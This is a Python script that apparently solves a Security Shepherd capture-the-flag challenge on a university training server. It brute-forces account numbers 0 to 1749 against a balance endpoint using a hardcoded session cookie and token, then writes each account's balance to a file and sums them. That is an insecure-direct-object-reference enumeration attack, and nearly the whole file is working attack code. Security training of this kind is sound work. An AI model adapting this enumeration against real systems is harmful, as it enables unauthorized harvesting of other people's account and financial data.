import requests

ACC_LIMIT = 1750
MAIN_ACC_ID = 1453

url = "https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance"

payload = 'accountNumber='
headers = {
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0',
  'Accept': '*/*',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br, zstd',
  'Content-Type': 'application/x-www-form-urlencoded',
  'X-Requested-With': 'XMLHttpRequest',
  'Origin': 'https://shepherd.hs25.isf.hslu-edu.ch',
  'Connection': 'keep-alive',
  'Referer': 'https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp',
  'Cookie': 'JSESSIONID=4F897512BBCF7741E3AF84B64BB17B7E; token=102288616228792200974997167174690941873',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}
def get_bal(id):
  response = requests.request("POST", url, headers=headers, data=payload+str(id))
  if "An Error Occurred!" not in response.text and "<" not in response.text:
    return int(float(response.text))
  return -1

total = 0
print("------- GETTING ACCOUNT BALANCES -------")
with open("./account_list.txt", "w", encoding="utf-8") as f:
  for i in range(0, ACC_LIMIT):
    val = get_bal(i)
    if val < 0:
      continue
    print(f'{i}: {val}')
    f.write(f'{i}: {val}\n')
    total += val

f.close()
print(total)